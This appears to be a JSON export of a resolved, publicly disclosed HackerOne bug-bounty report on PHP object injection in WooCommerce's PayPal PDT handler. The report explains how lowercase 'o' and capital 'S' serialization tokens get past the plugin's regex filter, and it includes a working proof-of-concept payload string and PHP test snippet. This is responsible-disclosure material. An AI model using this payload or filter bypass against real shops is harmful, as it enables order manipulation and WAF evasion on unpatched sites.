{
  "id": 245228,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDUyMjg=",
  "url": "https://hackerone.com/reports/245228",
  "title": "Object Injection in Woocommerce / Handle PDT Responses from PayPal",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2017-07-02T01:13:06.370Z",
  "submitted_at": "2017-07-02T01:13:06.370Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": true,
    "username": "b258ea62bf297b02afa9854",
    "url": "/b258ea62bf297b02afa9854",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 111,
    "url": "https://hackerone.com/automattic",
    "handle": "automattic",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Automattic",
      "twitter_handle": "",
      "website": "https://automattic.com",
      "about": "WordPress.com, Jetpack, Texts, Akismet, Gravatar, WooCommerce, Crowdsignal, Tumblr and more!"
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2017-09-11T13:48:49.750Z",
  "bug_reporter_agreed_on_going_public_at": "2017-08-16T12:53:50.942Z",
  "team_member_agreed_on_going_public_at": "2017-09-11T13:48:49.700Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "At this moment prevention from object injection is in the following line of code: \n```\npreg_match( '/^a:2:{/', $raw_custom ) && ! preg_match( '/[CO]:\\+?[0-9]+:\"/', $raw_custom ) && ( $custom = maybe_unserialize( $raw_custom ) )\n```\nbut the PHP native [unserialize](https://github.com/php/php-src/blob/master/ext/standard/var_unserializer.c) function supports little `o` as option in it and it is a StdClass object. \n\nDue this protection, we have a bypass (PoC below) e.g. due the fact how woocommerce gets the order we can set any order object we want. As an extra, if combined with capital `S` then for some attacks even known firewall rules will fail/will be bypassed.\n```\n$attack_str = 'a:2:{i:1;s:3:\"key\";i:0;o:3:\"s:2:\"ID\";o:1:\"s:0:\"\";o:1:\"s:2:\"ID\";S:1:\"1\";}}s:9:\"order_key\";s:3:\"key\";s:9:\"post_type\";s:2:\"ok\";}}';\n\nif (preg_match( '/^a:2:{/', $attack_str ) && ! preg_match( '/[CO]:\\+?[0-9]+:\"/', $attack_str )){\n\tvar_dump(unserialize($attack_str));\n}\n```\n",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2017-09-15T12:53:50.990Z",
  "allow_singular_disclosure_after": -202348295.99930602,
  "singular_disclosure_allowed": true,
  "vote_count": 7,
  "voters": [
    "marcs0h",
    "cuso4",
    "apapedulimu",
    "eveeez",
    "kuyschi",
    "mr_r3boot",
    "japz"
  ],
  "severity": {
    "rating": "medium",
    "author_type": "User"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
